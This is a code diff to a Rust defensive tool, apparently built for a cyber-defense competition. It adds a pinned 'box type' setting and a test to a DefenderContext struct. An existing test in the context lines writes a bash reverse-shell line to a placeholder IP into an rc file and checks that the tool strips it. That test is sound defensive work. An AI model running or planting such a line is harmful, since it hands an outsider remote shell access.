@@ -176,6 +176,9 @@ pub struct DefenderContext {
     /// When the competition started — artifacts created after this time are
     /// flagged as more suspicious.
     pub competition_start: Option<SystemTime>,
+    /// Box type the operator confirmed (the TUI's box selection). When set,
+    /// checks use it instead of re-detecting from what is installed.
+    pub box_type: Option<super::BoxType>,
 }
 
 impl std::fmt::Debug for DefenderContext {
@@ -198,7 +201,19 @@ impl DefenderContext {
             finding_tx: None,
             progress_tx: None,
             competition_start: None,
+            box_type: None,
         }
+    }
+
+    /// Pin the box type, overriding detection.
+    pub fn with_box_type(mut self, box_type: super::BoxType) -> Self {
+        self.box_type = Some(box_type);
+        self
+    }
+
+    /// The pinned box type, or a fresh detection when none was set.
+    pub fn box_type(&self) -> super::BoxType {
+        self.box_type.unwrap_or_else(super::detect_box_type)
     }
 
     /// Attach a progress channel so that `progress()` sends lines to the TUI
@@ -754,6 +769,14 @@ mod tests {
         std::fs::write(&rc, "export A=1\nbash -i >& /dev/tcp/1.2.3.4/9 0>&1\n").unwrap();
         assert!(ctx.remove_line_from_file_logged(&rc, "bash -i >& /dev/tcp/1.2.3.4/9 0>&1"));
         assert_eq!(std::fs::read_to_string(&rc).unwrap(), "export A=1\n");
+    }
+
+    #[test]
+    fn pinned_box_type_overrides_detection() {
+        for bt in crate::core::BoxType::ALL {
+            let ctx = DefenderContext::new(PathBuf::from("/dev/null"), false).with_box_type(*bt);
+            assert_eq!(ctx.box_type(), *bt);
+        }
     }
 
     #[test]
